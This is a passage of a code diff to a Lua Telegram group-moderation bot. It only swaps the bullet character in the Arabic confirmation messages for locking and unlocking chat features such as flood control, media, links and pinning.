-                  send(msg.chat_id_, msg.id_, 1, '● - `تم `✔️ `فتح التكرار `🔓\n\n● - `خاصية : المسح `⚠️', 1, 'md')
+                  send(msg.chat_id_, msg.id_, 1, '• `تم `✔️ `فتح التكرار `🔓\n\n• `خاصية : المسح `⚠️', 1, 'md')
                   end
                    database:set('anti-flood:del'..msg.chat_id_,true)
               else
                 if database:get('lang:gp:'..msg.chat_id_) then
                     send(msg.chat_id_, msg.id_, 1, "_> *Flood del* is Already_ *Unlocked*", 1, 'md')
                 else
-                 send(msg.chat_id_, msg.id_, 1, '● - `بالفعل تم` ✔️ `فتح التكرار` 🔓\n\n● - `خاصية : المسح` ⚠️', 1, 'md')
+                 send(msg.chat_id_, msg.id_, 1, '• `بالفعل تم` ✔️ `فتح التكرار` 🔓\n\n• `خاصية : المسح` ⚠️', 1, 'md')
                 end
               end
             end
@@ -4040,14 +3743,14 @@ end
                 if database:get('lang:gp:'..msg.chat_id_) then
                     send(msg.chat_id_, msg.id_, 1, "_> Pin Has been_ *Unlocked*", 1, 'md')
                 else
-                  send(msg.chat_id_, msg.id_, 1, '● - `تم `✔️ `فتح التثبيت `🔓\n\n● - `خاصية : المسح `⚠️', 1, 'md')
+                  send(msg.chat_id_, msg.id_, 1, '• `تم `✔️ `فتح التثبيت `🔓\n\n• `خاصية : المسح `⚠️', 1, 'md')
                 end
                 database:del('bot:pin:mute'..msg.chat_id_)
               else
                 if database:get('lang:gp:'..msg.chat_id_) then
                     send(msg.chat_id_, msg.id_, 1, "_> Pin is Already_ *Unlocked*", 1, 'md')
                 else
-                 send(msg.chat_id_, msg.id_, 1, '● - `بالفعل تم` ✔️ `فتح التثبيت` 🔓\n\n● - `خاصية : المسح` ⚠️', 1, 'md')
+                 send(msg.chat_id_, msg.id_, 1, '• `بالفعل تم` ✔️ `فتح التثبيت` 🔓\n\n• `خاصية : المسح` ⚠️', 1, 'md')
                 end
               end
             end
@@ -4056,14 +3759,14 @@ end
                 if database:get('lang:gp:'..msg.chat_id_) then
                     send(msg.chat_id_, msg.id_, 1, "_> Pin warn Has been_ *Unlocked*", 1, 'md')
                 else
-                send(msg.chat_id_, msg.id_, 1, '● - `تم `✔️ `فتح التثبيت `🔓\n\n● - `خاصية : التحذير `⚠️', 1, 'md')
+                send(msg.chat_id_, msg.id_, 1, '• `تم `✔️ `فتح التثبيت `🔓\n\n• `خاصية : التحذير `⚠️', 1, 'md')
                 end
                 database:del('bot:pin:warn'..msg.chat_id_)
               else
                 if database:get('lang:gp:'..msg.chat_id_) then
                     send(msg.chat_id_, msg.id_, 1, "_> Pin warn is Already_ *Unlocked*", 1, 'md')
                 else
-                 send(msg.chat_id_, msg.id_, 1, '● - `بالفعل تم` ✔️ `فتح التثبيت` 🔓\n\n● - `خاصية : التحذير` ⚠️', 1, 'md')
+                 send(msg.chat_id_, msg.id_, 1, '• `بالفعل تم` ✔️ `فتح التثبيت` 🔓\n\n• `خاصية : التحذير` ⚠️', 1, 'md')
                 end
               end
             end
@@ -4076,7 +3779,7 @@ end
                 if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_> Group muted for_ *'..mutept[1]..'* _seconds!_', 1, 'md')
        else 
-              send(msg.chat_id_, msg.id_, 1, "`● - تم قفل كل الوسائط لمدة` "..mutept[1].." `ثانيه` 🔐❌", 'md')
+              send(msg.chat_id_, msg.id_, 1, "`• تم قفل كل الوسائط لمدة` "..mutept[1].." `ثانيه` 🔐❌", 'md')
 end
 	end
 
@@ -4090,7 +3793,7 @@ end
                 if database:get('lang:gp:'..msg.chat_id_) then
               send(msg.chat_id_, msg.id_, 1, "> Lock all has been enable for "..mutept[1].." hours !", 'md')
        else 
-              send(msg.chat_id_, msg.id_, 1, "`● - تم قفل كل الوسائط لمدة` "..mutept[1].." `ساعه` 🔐❌", 'md')
+              send(msg.chat_id_, msg.id_, 1, "`• تم قفل كل الوسائط لمدة` "..mutept[1].." `ساعه` 🔐❌", 'md')
 end
      end
 	-----------------------------------------------------------------------------------------------
@@ -4102,14 +3805,14 @@ end
     if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_> mute all has been_ *Locked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `تم` ✔️ `قفل كل الوسائط `🔐\n\n● - `خاصية : المسح` ☑️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `تم` ✔️ `قفل كل الوسائط `🔐\n\n• `خاصية : المسح` ☑️', 1, 'md')
       end
          database:set('bot:muteall'..msg.chat_id_,true)
       else
     if database:get('lang:gp:'..msg.chat_id_) then
           send(msg.chat_id_, msg.id_, 1, '_> mute all is already_ *Locked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `بالفعل تم` ✔️ `قفل كل الوسائط` 🔐\n\n● - `خاصية : المسح` ☑️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `بالفعل تم` ✔️ `قفل كل الوسائط` 🔐\n\n• `خاصية : المسح` ☑️', 1, 'md')
       end
       end
       end
@@ -4118,14 +3821,14 @@ end
     if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_> mute all warn has been_ *Locked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `تم` ✔️ `قفل كل الوسائط `🔐\n\n● - `خاصية : التحذير` ☑️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `تم` ✔️ `قفل كل الوسائط `🔐\n\n• `خاصية : التحذير` ☑️', 1, 'md')
       end
          database:set('bot:muteallwarn'..msg.chat_id_,true)
       else
     if database:get('lang:gp:'..msg.chat_id_) then
                   send(msg.chat_id_, msg.id_, 1, '_> mute all warn is already_ *Locked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `بالفعل تم` ✔️ `قفل كل الوسائط` 🔐\n\n● - `خاصية : التحذير` ☑️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `بالفعل تم` ✔️ `قفل كل الوسائط` 🔐\n\n• `خاصية : التحذير` ☑️', 1, 'md')
       end
       end
       end
@@ -4134,14 +3837,14 @@ end
     if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_> mute all ban has been_ *Locked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `تم` ✔️ `قفل كل الوسائط `🔐\n\n● - `خاصية : الطرد` ☑️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `تم` ✔️ `قفل كل الوسائط `🔐\n\n• `خاصية : الطرد` ☑️', 1, 'md')
       end
          database:set('bot:muteallban'..msg.chat_id_,true)
       else
     if database:get('lang:gp:'..msg.chat_id_) then
                   send(msg.chat_id_, msg.id_, 1, '_> mute all ban is already_ *Locked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `بالفعل تم` ✔️ `قفل كل الوسائط` 🔐\n\n● - `خاصية : الطرد` ☑️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `بالفعل تم` ✔️ `قفل كل الوسائط` 🔐\n\n• `خاصية : الطرد` ☑️', 1, 'md')
       end
       end
       end
@@ -4150,14 +3853,14 @@ end
     if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_> Text has been_ *Locked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `تم` ✔️ `قفل الدردشه `🔐\n\n● - `خاصية : المسح` ☑️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `تم` ✔️ `قفل الدردشه `🔐\n\n• `خاصية : المسح` ☑️', 1, 'md')
       end
          database:set('bot:text:mute'..msg.chat_id_,true)
       else
     if database:get('lang:gp:'..msg.chat_id_) then
                   send(msg.chat_id_, msg.id_, 1, '_> Text is already_ *Locked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `بالفعل تم` ✔️ `قفل الدردشه` 🔐\n\n● - `خاصية : المسح` ☑️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `بالفعل تم` ✔️ `قفل الدردشه` 🔐\n\n• `خاصية : المسح` ☑️', 1, 'md')
       end
       end
       end
@@ -4166,14 +3869,14 @@ end
     if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_> Text ban has been_ *Locked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `تم` ✔️ `قفل الدردشه `🔐\n\n● - `خاصية : الطرد` ☑️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `تم` ✔️ `قفل الدردشه `🔐\n\n• `خاصية : الطرد` ☑️', 1, 'md')
       end
          database:set('bot:text:ban'..msg.chat_id_,true)
       else
     if database:get('lang:gp:'..msg.chat_id_) then
                   send(msg.chat_id_, msg.id_, 1, '_> Text ban is already_ *Locked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `بالفعل تم` ✔️ `قفل الدردشه` 🔐\n\n● - `خاصية : الطرد` ☑️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `بالفعل تم` ✔️ `قفل الدردشه` 🔐\n\n• `خاصية : الطرد` ☑️', 1, 'md')
       end
       end
       end
@@ -4182,14 +3885,14 @@ end
     if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_> Text ban has been_ *Locked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `تم` ✔️ `قفل الدردشه `🔐\n\n● - `خاصية : التحذير` ☑️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `تم` ✔️ `قفل الدردشه `🔐\n\n• `خاصية : التحذير` ☑️', 1, 'md')
       end
          database:set('bot:text:warn'..msg.chat_id_,true)
       else
     if database:get('lang:gp:'..msg.chat_id_) then
                   send(msg.chat_id_, msg.id_, 1, '_> Text warn is already_ *Locked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `بالفعل تم` ✔️ `قفل الدردشه` 🔐\n\n● - `خاصية : التحذير` ☑️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `بالفعل تم` ✔️ `قفل الدردشه` 🔐\n\n• `خاصية : التحذير` ☑️', 1, 'md')
       end
       end
       end
@@ -4198,14 +3901,14 @@ end
     if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_> inline has been_ *Locked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `تم` ✔️ `قفل الانلاين `🔐\n\n● - `خاصية : المسح` ☑️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `تم` ✔️ `قفل الانلاين `🔐\n\n• `خاصية : المسح` ☑️', 1, 'md')
       end
          database:set('bot:inline:mute'..msg.chat_id_,true)
       else
     if database:get('lang:gp:'..msg.chat_id_) then
                   send(msg.chat_id_, msg.id_, 1, '_> inline is already_ *Locked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `بالفعل تم` ✔️ `قفل الانلاين` 🔐\n\n● - `خاصية : المسح` ☑️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `بالفعل تم` ✔️ `قفل الانلاين` 🔐\n\n• `خاصية : المسح` ☑️', 1, 'md')
       end
       end
       end
@@ -4214,14 +3917,14 @@ end
     if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_> inline ban has been_ *Locked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `تم` ✔️ `قفل الانلاين `🔐\n\n● - `خاصية : الطرد` ☑️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `تم` ✔️ `قفل الانلاين `🔐\n\n• `خاصية : الطرد` ☑️', 1, 'md')
       end
          database:set('bot:inline:ban'..msg.chat_id_,true)
       else
     if database:get('lang:gp:'..msg.chat_id_) then
                   send(msg.chat_id_, msg.id_, 1, '_> inline ban is already_ *Locked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `بالفعل تم` ✔️ `قفل الانلاين` 🔐\n\n● - `خاصية : الطرد` ☑️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `بالفعل تم` ✔️ `قفل الانلاين` 🔐\n\n• `خاصية : الطرد` ☑️', 1, 'md')
       end
       end
       end
@@ -4230,14 +3933,14 @@ end
     if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_> inline ban has been_ *Locked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `تم` ✔️ `قفل الانلاين `🔐\n\n● - `خاصية : التحذير` ☑️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `تم` ✔️ `قفل الانلاين `🔐\n\n• `خاصية : التحذير` ☑️', 1, 'md')
       end
          database:set('bot:inline:warn'..msg.chat_id_,true)
       else
     if database:get('lang:gp:'..msg.chat_id_) then
                   send(msg.chat_id_, msg.id_, 1, '_> inline warn is already_ *Locked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `بالفعل تم` ✔️ `قفل الانلاين` 🔐\n\n● - `خاصية : التحذير` ☑️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `بالفعل تم` ✔️ `قفل الانلاين` 🔐\n\n• `خاصية : التحذير` ☑️', 1, 'md')
       end
       end
       end
@@ -4246,14 +3949,14 @@ end
     if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_> photo has been_ *Locked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `تم` ✔️ `قفل الصور `🔐\n\n● - `خاصية : المسح` ☑️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `تم` ✔️ `قفل الصور `🔐\n\n• `خاصية : المسح` ☑️', 1, 'md')
       end
          database:set('bot:photo:mute'..msg.chat_id_,true)
       else
     if database:get('lang:gp:'..msg.chat_id_) then
                   send(msg.chat_id_, msg.id_, 1, '_> photo is already_ *Locked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `بالفعل تم` ✔️ `قفل الصور` 🔐\n\n● - `خاصية : المسح` ☑️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `بالفعل تم` ✔️ `قفل الصور` 🔐\n\n• `خاصية : المسح` ☑️', 1, 'md')
       end
       end
       end
@@ -4262,14 +3965,14 @@ end
     if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_> photo ban has been_ *Locked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `تم` ✔️ `قفل الصور `🔐\n\n● - `خاصية : الطرد` ☑️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `تم` ✔️ `قفل الصور `🔐\n\n• `خاصية : الطرد` ☑️', 1, 'md')
       end
          database:set('bot:photo:ban'..msg.chat_id_,true)
       else
     if database:get('lang:gp:'..msg.chat_id_) then
                   send(msg.chat_id_, msg.id_, 1, '_> photo ban is already_ *Locked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `بالفعل تم` ✔️ `قفل الصور` 🔐\n\n● - `خاصية : الطرد` ☑️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `بالفعل تم` ✔️ `قفل الصور` 🔐\n\n• `خاصية : الطرد` ☑️', 1, 'md')
       end
       end
       end
@@ -4278,14 +3981,14 @@ end
     if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_> photo ban has been_ *Locked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `تم` ✔️ `قفل الصور `🔐\n\n● - `خاصية : التحذير` ☑️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `تم` ✔️ `قفل الصور `🔐\n\n• `خاصية : التحذير` ☑️', 1, 'md')
       end
          database:set('bot:photo:warn'..msg.chat_id_,true)
       else
     if database:get('lang:gp:'..msg.chat_id_) then
                   send(msg.chat_id_, msg.id_, 1, '_> photo warn is already_ *Locked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `بالفعل تم` ✔️ `قفل الصور` 🔐\n\n● - `خاصية : التحذير` ☑️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `بالفعل تم` ✔️ `قفل الصور` 🔐\n\n• `خاصية : التحذير` ☑️', 1, 'md')
       end
       end
       end
@@ -4294,14 +3997,14 @@ end
     if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_> video has been_ *Locked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `تم` ✔️ `قفل الفيديوهات `🔐\n\n● - `خاصية : المسح` ☑️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `تم` ✔️ `قفل الفيديوهات `🔐\n\n• `خاصية : المسح` ☑️', 1, 'md')
       end
          database:set('bot:video:mute'..msg.chat_id_,true)
       else
     if database:get('lang:gp:'..msg.chat_id_) then
                   send(msg.chat_id_, msg.id_, 1, '_> video is already_ *Locked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `بالفعل تم` ✔️ `قفل الفيديوهات` 🔐\n\n● - `خاصية : المسح` ☑️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `بالفعل تم` ✔️ `قفل الفيديوهات` 🔐\n\n• `خاصية : المسح` ☑️', 1, 'md')
       end
       end
       end
@@ -4310,14 +4013,14 @@ end
     if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_> video ban has been_ *Locked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `تم` ✔️ `قفل الفيديوهات `🔐\n\n● - `خاصية : الطرد` ☑️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `تم` ✔️ `قفل الفيديوهات `🔐\n\n• `خاصية : الطرد` ☑️', 1, 'md')
       end
          database:set('bot:video:ban'..msg.chat_id_,true)
       else
     if database:get('lang:gp:'..msg.chat_id_) then
                   send(msg.chat_id_, msg.id_, 1, '_> video ban is already_ *Locked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `بالفعل تم` ✔️ `قفل الفيديوهات` 🔐\n\n● - `خاصية : الطرد` ☑️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `بالفعل تم` ✔️ `قفل الفيديوهات` 🔐\n\n• `خاصية : الطرد` ☑️', 1, 'md')
       end
       end
       end
@@ -4326,14 +4029,14 @@ end
     if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_> video ban has been_ *Locked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `تم` ✔️ `قفل الفيديوهات `🔐\n\n● - `خاصية : التحذير` ☑️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `تم` ✔️ `قفل الفيديوهات `🔐\n\n• `خاصية : التحذير` ☑️', 1, 'md')
       end
          database:set('bot:video:warn'..msg.chat_id_,true)
       else
     if database:get('lang:gp:'..msg.chat_id_) then
                   send(msg.chat_id_, msg.id_, 1, '_> video warn is already_ *Locked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `بالفعل تم` ✔️ `قفل الفيديوهات` 🔐\n\n● - `خاصية : التحذير` ☑️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `بالفعل تم` ✔️ `قفل الفيديوهات` 🔐\n\n• `خاصية : التحذير` ☑️', 1, 'md')
       end
       end
       end
@@ -4342,14 +4045,14 @@ end
     if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_> gifs has been_ *Locked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `تم` ✔️ `قفل المتحركه `🔐\n\n● - `خاصية : المسح` ☑️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `تم` ✔️ `قفل المتحركه `🔐\n\n• `خاصية : المسح` ☑️', 1, 'md')
       end
          database:set('bot:gifs:mute'..msg.chat_id_,true)
       else
     if database:get('lang:gp:'..msg.chat_id_) then
                   send(msg.chat_id_, msg.id_, 1, '_> gifs is already_ *Locked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `بالفعل تم` ✔️ `قفل المتحركه` 🔐\n\n● - `خاصية : المسح` ☑️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `بالفعل تم` ✔️ `قفل المتحركه` 🔐\n\n• `خاصية : المسح` ☑️', 1, 'md')
       end
       end
       end
@@ -4358,14 +4061,14 @@ end
     if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_> gifs ban has been_ *Locked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `تم` ✔️ `قفل المتحركه `🔐\n\n● - `خاصية : الطرد` ☑️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `تم` ✔️ `قفل المتحركه `🔐\n\n• `خاصية : الطرد` ☑️', 1, 'md')
       end
          database:set('bot:gifs:ban'..msg.chat_id_,true)
       else
     if database:get('lang:gp:'..msg.chat_id_) then
                   send(msg.chat_id_, msg.id_, 1, '_> gifs ban is already_ *Locked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `بالفعل تم` ✔️ `قفل المتحركه` 🔐\n\n● - `خاصية : الطرد` ☑️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `بالفعل تم` ✔️ `قفل المتحركه` 🔐\n\n• `خاصية : الطرد` ☑️', 1, 'md')
       end
       end
       end
@@ -4374,14 +4077,14 @@ end
     if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_> gifs ban has been_ *Locked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `تم` ✔️ `قفل المتحركه `🔐\n\n● - `خاصية : التحذير` ☑️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `تم` ✔️ `قفل المتحركه `🔐\n\n• `خاصية : التحذير` ☑️', 1, 'md')
       end
          database:set('bot:gifs:warn'..msg.chat_id_,true)
       else
     if database:get('lang:gp:'..msg.chat_id_) then
                   send(msg.chat_id_, msg.id_, 1, '_> gifs warn is already_ *Locked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `بالفعل تم` ✔️ `قفل المتحركه` 🔐\n\n● - `خاصية : التحذير` ☑️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `بالفعل تم` ✔️ `قفل المتحركه` 🔐\n\n• `خاصية : التحذير` ☑️', 1, 'md')
       end
       end
       end
@@ -4390,14 +4093,14 @@ end
     if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_> music has been_ *Locked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `تم` ✔️ `قفل الاغاني `🔐\n\n● - `خاصية : المسح` ☑️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `تم` ✔️ `قفل الاغاني `🔐\n\n• `خاصية : المسح` ☑️', 1, 'md')
       end
          database:set('bot:music:mute'..msg.chat_id_,true)
       else
     if database:get('lang:gp:'..msg.chat_id_) then
                   send(msg.chat_id_, msg.id_, 1, '_> music is already_ *Locked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `بالفعل تم` ✔️ `قفل الاغاني` 🔐\n\n● - `خاصية : المسح` ☑️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `بالفعل تم` ✔️ `قفل الاغاني` 🔐\n\n• `خاصية : المسح` ☑️', 1, 'md')
       end
       end
       end
@@ -4406,14 +4109,14 @@ end
     if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_> music ban has been_ *Locked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `تم` ✔️ `قفل الاغاني `🔐\n\n● - `خاصية : الطرد` ☑️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `تم` ✔️ `قفل الاغاني `🔐\n\n• `خاصية : الطرد` ☑️', 1, 'md')
       end
          database:set('bot:music:ban'..msg.chat_id_,true)
       else
     if database:get('lang:gp:'..msg.chat_id_) then
                   send(msg.chat_id_, msg.id_, 1, '_> music ban is already_ *Locked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `بالفعل تم` ✔️ `قفل الاغاني` 🔐\n\n● - `خاصية : الطرد` ☑️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `بالفعل تم` ✔️ `قفل الاغاني` 🔐\n\n• `خاصية : الطرد` ☑️', 1, 'md')
       end
       end
       end
@@ -4422,14 +4125,14 @@ end
     if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_> music ban has been_ *Locked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `تم` ✔️ `قفل الاغاني `🔐\n\n● - `خاصية : التحذير` ☑️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `تم` ✔️ `قفل الاغاني `🔐\n\n• `خاصية : التحذير` ☑️', 1, 'md')
       end
          database:set('bot:music:warn'..msg.chat_id_,true)
       else
     if database:get('lang:gp:'..msg.chat_id_) then
                   send(msg.chat_id_, msg.id_, 1, '_> music warn is already_ *Locked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `بالفعل تم` ✔️ `قفل الاغاني` 🔐\n\n● - `خاصية : التحذير` ☑️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `بالفعل تم` ✔️ `قفل الاغاني` 🔐\n\n• `خاصية : التحذير` ☑️', 1, 'md')
       end
       end
       end
@@ -4438,14 +4141,14 @@ end
     if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_> voice has been_ *Locked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `تم` ✔️ `قفل الصوتيات `🔐\n\n● - `خاصية : المسح` ☑️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `تم` ✔️ `قفل الصوتيات `🔐\n\n• `خاصية : المسح` ☑️', 1, 'md')
       end
          database:set('bot:voice:mute'..msg.chat_id_,true)
       else
     if database:get('lang:gp:'..msg.chat_id_) then
                   send(msg.chat_id_, msg.id_, 1, '_> voice is already_ *Locked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `بالفعل تم` ✔️ `قفل الصوتيات` 🔐\n\n● - `خاصية : المسح` ☑️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `بالفعل تم` ✔️ `قفل الصوتيات` 🔐\n\n• `خاصية : المسح` ☑️', 1, 'md')
       end
       end
       end
@@ -4454,14 +4157,14 @@ end
     if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_> voice ban has been_ *Locked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `تم` ✔️ `قفل الصوتيات `🔐\n\n● - `خاصية : الطرد` ☑️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `تم` ✔️ `قفل الصوتيات `🔐\n\n• `خاصية : الطرد` ☑️', 1, 'md')
       end
          database:set('bot:voice:ban'..msg.chat_id_,true)
       else
     if database:get('lang:gp:'..msg.chat_id_) then
                   send(msg.chat_id_, msg.id_, 1, '_> voice ban is already_ *Locked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `بالفعل تم` ✔️ `قفل الصوتيات` 🔐\n\n● - `خاصية : الطرد` ☑️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `بالفعل تم` ✔️ `قفل الصوتيات` 🔐\n\n• `خاصية : الطرد` ☑️', 1, 'md')
       end
       end
       end
@@ -4470,14 +4173,14 @@ end
     if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_> voice ban has been_ *Locked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `تم` ✔️ `قفل الصوتيات `🔐\n\n● - `خاصية : التحذير` ☑️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `تم` ✔️ `قفل الصوتيات `🔐\n\n• `خاصية : التحذير` ☑️', 1, 'md')
       end
          database:set('bot:voice:warn'..msg.chat_id_,true)
       else
     if database:get('lang:gp:'..msg.chat_id_) then
                   send(msg.chat_id_, msg.id_, 1, '_> voice warn is already_ *Locked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `بالفعل تم` ✔️ `قفل الصوتيات` 🔐\n\n● - `خاصية : التحذير` ☑️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `بالفعل تم` ✔️ `قفل الصوتيات` 🔐\n\n• `خاصية : التحذير` ☑️', 1, 'md')
       end
       end
       end
@@ -4486,14 +4189,14 @@ end
     if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_> links has been_ *Locked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `تم` ✔️ `قفل الروابط `🔐\n\n● - `خاصية : المسح` ☑️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `تم` ✔️ `قفل الروابط `🔐\n\n• `خاصية : المسح` ☑️', 1, 'md')
       end
          database:set('bot:links:mute'..msg.chat_id_,true)
       else
     if database:get('lang:gp:'..msg.chat_id_) then
                   send(msg.chat_id_, msg.id_, 1, '_> links is already_ *Locked*', 1, 'md')
       else
